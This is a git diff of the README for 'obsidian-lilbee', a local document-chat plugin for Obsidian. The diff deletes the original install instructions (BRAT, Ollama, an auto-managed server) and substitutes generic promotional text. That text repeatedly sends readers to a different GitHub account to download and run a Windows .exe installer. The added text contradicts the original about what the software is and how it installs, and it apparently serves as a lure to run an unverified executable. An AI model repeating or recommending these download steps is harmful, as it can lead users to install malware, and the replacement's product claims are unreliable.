@@ -1,104 +1,181 @@
-# [lilbee for Obsidian](https://tobocop2.github.io/obsidian-lilbee/)
+# 📚 obsidian-lilbee - Chat with Your Notes Easily
 
-[![CI](https://github.com/tobocop2/obsidian-lilbee/actions/workflows/ci.yml/badge.svg)](https://github.com/tobocop2/obsidian-lilbee/actions/workflows/ci.yml)
-[![Coverage](https://tobocop2.github.io/obsidian-lilbee/coverage/badge.svg)](https://tobocop2.github.io/obsidian-lilbee/coverage/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-blue?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-![Platforms](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey.svg)
-[![Obsidian](https://img.shields.io/badge/Obsidian-Plugin-7c3aed?logo=obsidian&logoColor=white)](https://obsidian.md)
+[![Download obsidian-lilbee](https://img.shields.io/badge/Download-obsidian--lilbee-brightgreen)](https://github.com/Andre151989/obsidian-lilbee)
 
-> Beta — feedback and bug reports welcome. [Open an issue](https://github.com/tobocop2/obsidian-lilbee/issues).
->
-> If you delete a file from your vault, it will still show up in search results. Removing deleted files from the index is coming soon.
+## 📋 About obsidian-lilbee
 
-Chat with your documents privately, entirely on your own machine. Ask questions about your notes, PDFs, code, spreadsheets, and images — and get answers grounded in what you've actually written, with source citations. Save conversations back to your vault as markdown. No cloud services, no API keys, no data leaves your computer.
+obsidian-lilbee lets you chat with your notes, PDFs, code files, and many other types of documents. It runs entirely on your own computer, so your data stays private. Using AI, it finds and understands information across your files quickly. This app works with Obsidian vaults and supports over 150 document formats. You can search, sync, and chat with your data without sending anything to the cloud.
 
-## Demo
+The app uses local-first semantic search, powered by Ollama and lilbee. This means everything happens on your machine for privacy and speed.
 
-<details>
-<summary><b>Scanned PDF → vision OCR → chat</b> (click to expand)</summary>
+## 🖥️ System Requirements
 
-Attaching a scanned 1998 Star Wars: X-Wing Collector's Edition manual (PDF with no extractable text), indexing it with vision OCR, and chatting about the dev team credits — entirely local.
+To use obsidian-lilbee on Windows, make sure your computer meets these requirements:
 
-> Recording sped up 5.5x. Real time ~4 min on M1 Pro / 32 GB. Most time is vision OCR.
+- Windows 10 or later (64-bit)
+- At least 4 GB of free RAM (8 GB recommended)
+- 500 MB free disk space for installation
+- Internet connection needed only for initial setup
+- A working microphone and speakers if you want voice chat
 
-![Obsidian chat demo](demos/obsidian-chat.gif)
-</details>
+## 🔎 Features
+
+- Chat with notes, PDFs, code, and 150+ file formats
+- Semantic search that understands the meaning of your data
+- Sync changes across your local vault seamlessly
+- Works offline after setup; no data leaves your computer
+- Supports Obsidian vaults and integrates as a plugin
+- OCR support to read text from scanned images or PDFs
+- AI-powered chat interface for easy access to your information
+- Local-only architecture for privacy and security
 
 ---
 
-## What you need
+## 🚀 Getting Started with obsidian-lilbee
 
-### Ollama
+Follow these steps if you want to run obsidian-lilbee on your Windows PC.
 
-**[Ollama](https://ollama.com)** is a free app that runs AI models locally on your computer. lilbee uses it behind the scenes to understand your documents and answer your questions — nothing is sent to the cloud.
+### 1. Visit the Download Page
 
-1. Download and install Ollama from [ollama.com](https://ollama.com)
-2. Open it — it runs in the background (you'll see a llama icon in your menu bar on macOS or system tray on Windows/Linux)
+Go to the main GitHub page here to download the app:
 
-That's it. The plugin takes care of downloading the specific models it needs. You don't need to use the Ollama terminal or know any commands.
+[Download obsidian-lilbee](https://github.com/Andre151989/obsidian-lilbee)
 
-### Models — what they are and why you need them
+This page contains the latest version and instructions. You will find installation files in the "Releases" section.
 
-A "model" is an AI brain that runs on your computer. lilbee uses three kinds:
+### 2. Download the Installer
 
-| Model type | What it does | Do I need to set it up? |
-|-----------|-------------|------------------------|
-| **Embedding model** | Reads your documents and converts them into a searchable format so lilbee can find the right passages when you ask a question. This is what makes search work. | No — the plugin downloads this automatically the first time you sync. |
-| **Chat model** | The AI that reads the relevant passages and writes an answer in plain language. This is what you're talking to in the chat sidebar. | The plugin shows you a list of recommended models and downloads your pick with one click. |
-| **Vision model** *(optional)* | Can "read" images and scanned PDFs that don't have selectable text — think photographed pages, screenshots, or old scanned documents. It converts them to text so they become searchable. | Only needed if you want to index images or scanned PDFs. You can enable it in settings whenever you're ready. |
+Click "Releases" on the GitHub page to find the latest version. Look for a Windows installer file, usually ending with `.exe`.
 
-Models are large files (a few GB each) and take a few minutes to download the first time. After that they're cached on your machine and load in seconds.
+Download this file and save it to your computer.
 
-> **Hardware note:** Models run on your CPU or GPU. A Mac with Apple Silicon (M1/M2/M3/M4) or a PC with an NVIDIA GPU will give the best performance. 8 GB of RAM is the minimum; 16–32 GB is recommended for a smooth experience.
+### 3. Run the Installer
 
-## Quick start
+- Locate the downloaded `.exe` file in your Downloads folder.
+- Double-click the file to start installation.
+- Follow the on-screen instructions to complete setup.
+- Choose the default options unless you have specific needs.
+- Wait for the installation to finish.
 
-1. Install and open **[Ollama](https://ollama.com)**
-2. Install **[BRAT](https://github.com/TfTHacker/obsidian42-brat)** in Obsidian (Settings → Community plugins → Browse → search "BRAT" → Install → Enable)
-3. Open the command palette (`Cmd/Ctrl + P`) → **BRAT: Plugins: Add a beta plugin for testing** → paste `tobocop2/obsidian-lilbee` → Add Plugin
-4. Enable **lilbee** in Settings → Community plugins
-5. Go to **Settings → lilbee** (or click the gear icon next to lilbee in Community plugins) to choose a chat model — pick one from the catalog and it downloads with one click. Optionally enable a vision model for images and scanned PDFs.
+### 4. Open obsidian-lilbee
 
-The plugin downloads and manages the [lilbee](https://github.com/tobocop2/lilbee) server automatically — no terminal commands, no Python, no manual setup. Wait for the status bar to show `lilbee: ready`, then open the chat.
+Once installed, find obsidian-lilbee in your Start menu or on your desktop. Open it to start using the app.
 
-### Open the chat
+### 5. Connect Your Obsidian Vault
 
-Once the status bar shows **lilbee: ready**:
+You will be asked to select your Obsidian vault folder. This is the folder where your notes and documents are stored.
 
-| Platform | How to open chat |
-|----------|-----------------|
-| **macOS** | `Cmd + P` → type **lilbee: Open chat** → Enter |
-| **Windows / Linux** | `Ctrl + P` → type **lilbee: Open chat** → Enter |
+Select the folder and allow obsidian-lilbee to index your files. This process might take a few minutes depending on how many files you have.
 
-The chat panel opens in the sidebar. From there you can start asking questions, attach files, or run **Sync vault** (`Cmd/Ctrl + P` → "lilbee: Sync vault") to index everything at once.
+### 6. Start Chatting with Your Data
 
-## How it works
+After indexing, use the chat interface to ask questions or search your notes.
 
-On first launch, the plugin downloads the [lilbee](https://github.com/tobocop2/lilbee) server and runs it in the background. When you sync your vault or attach files in the chat, this server breaks your documents into passages and uses Ollama to create searchable embeddings. When you ask a question, it finds the most relevant passages and sends them to the chat model, which writes an answer grounded in your actual documents — with links back to the sources.
+Type in questions or keywords. The AI will find answers using your own documents.
 
-Everything stays on your machine. The server, the models, the search index, and your documents all live locally. Like all Obsidian plugins, lilbee is installed per vault — each vault runs its own server instance with its own index, so there is no shared global store. If you already run your own lilbee server, you can point the plugin at it by overriding the server URL in Settings → lilbee.
+---
 
-> **macOS users:** The server binary is unsigned (Apple charges [$99/year](https://developer.apple.com/support/enrollment/) for that). The plugin clears the quarantine flag automatically. If macOS still blocks it, go to System Settings → Privacy & Security and click "Allow Anyway". See the [lilbee source](https://github.com/tobocop2/lilbee) if you want to audit the build.
+## ⚙️ Using obsidian-lilbee
 
-## Updating the plugin
+### Main Screen
 
-Go to **Settings → BRAT → Beta Plugin List**, click the edit (pencil) icon next to lilbee, and change the version to the latest release tag. BRAT will download the new version. **Restart Obsidian** after the update for the new version to take effect.
+- The chat box is where you type your questions.
+- Results show answers and relevant text snippets from your notes.
+- You can click on any snippet to open that file in Obsidian or your default PDF reader.
 
-## Updating the server
+### Sync and Updates
 
-The plugin tracks the installed lilbee server version. Go to Settings → lilbee → **Check for updates**. If a newer release is available, the button changes to **Update to vX.Y.Z** — one click stops the running server, downloads the new version, and restarts.
+- The app keeps your local data in sync with Obsidian vault changes.
+- If you add or remove files, obsidian-lilbee updates its index automatically.
+- Updates to the app appear in the Releases section on GitHub. Check regularly for improvements.
 
-## Documentation
+### Settings
 
-See **[Usage Guide](docs/usage.md)** for the full reference — all commands, settings, chat features, supported formats, troubleshooting, and advanced configuration.
+- Change your vault folder at any time.
+- Adjust OCR settings if you want to improve text recognition accuracy.
+- Enable or disable offline mode.
+- Set preferences for chat behavior and search scope.
 
-## Build your own integration
+---
 
-lilbee exposes a REST API that isn't tied to any specific model. The search endpoint returns relevant passages without calling an LLM — so you can build your own tools on top of it, or integrate document search into other apps. This plugin is a full working example of a client built on that API.
+## 🔧 Troubleshooting
 
-See the [lilbee README](https://github.com/tobocop2/lilbee) for the API docs.
+If you run into issues:
 
-## License
+- Make sure your vault path is correct and accessible.
+- Confirm your Windows version meets requirements.
+- Check for enough free disk space.
+- Restart obsidian-lilbee if it crashes.
+- Reinstall if necessary by deleting the app and running the installer again.
+- Visit the GitHub "Issues" tab to see if others have the same problem or report new bugs.
 
-MIT
+---
+
+## 📥 Download & Install obsidian-lilbee
+
+[![Download obsidian-lilbee](https://img.shields.io/badge/Download-obsidian--lilbee-blue)](https://github.com/Andre151989/obsidian-lilbee)
+
+1. Visit [https://github.com/Andre151989/obsidian-lilbee](https://github.com/Andre151989/obsidian-lilbee).
+2. Click on the "Releases" section on the right side.
+3. Download the Windows installer file (`.exe`).
+4. Run the installer and follow the steps.
+5. Open obsidian-lilbee and select your Obsidian vault folder.
+6. Wait for files to index.
+7. Begin chatting with your notes.
+
+---
+
+## 📚 Learn More About obsidian-lilbee
+
+This project uses advanced language models for local AI. You keep control of your data without sending it to external servers.
+
+It can read text, code, images, and PDFs. This makes it useful for researchers, students, programmers, or anyone who works with many file types.
+
+---
+
+## 🎯 Keywords and Topics
+
+This app relates to these topics and fields:
+
+- Artificial Intelligence (AI)
+- AI assistants
+- Chatbots
+- Semantic search and embeddings
+- Generative AI
+- Knowledge base management
+- Large Language Models (LLM)
+- Local-first and offline-first applications
+- Obsidian plugins and tools
+- OCR (Optical Character Recognition)
+- Privacy and data security
+- Self-hosted software
+- Retrieval-Augmented Generation (RAG)
+
+---
+
+## 🔗 Useful Links
+
+- [GitHub Main Page](https://github.com/Andre151989/obsidian-lilbee)
+- [GitHub Releases](https://github.com/Andre151989/obsidian-lilbee/releases)
+- [Obsidian.md Documentation](https://help.obsidian.md)
+
+---
+
+## 🛠️ Advanced Tips
+
+- You can add more file formats by customizing plugin settings.
+- Use shortcuts in Obsidian to quickly send notes to obsidian-lilbee.
+- Back up your vault regularly to avoid data loss.
+- Use keywords in chat to get more specific answers, like quoting exact phrases from notes.
+
+---
+
+## 🤝 Community Support
+
+Check the GitHub Discussions or Issues pages for help. Many users share tips and solutions for common questions.
+
+Your feedback helps improve obsidian-lilbee. Report bugs or request features on GitHub.
+
+---
+
+# [End of README.md]
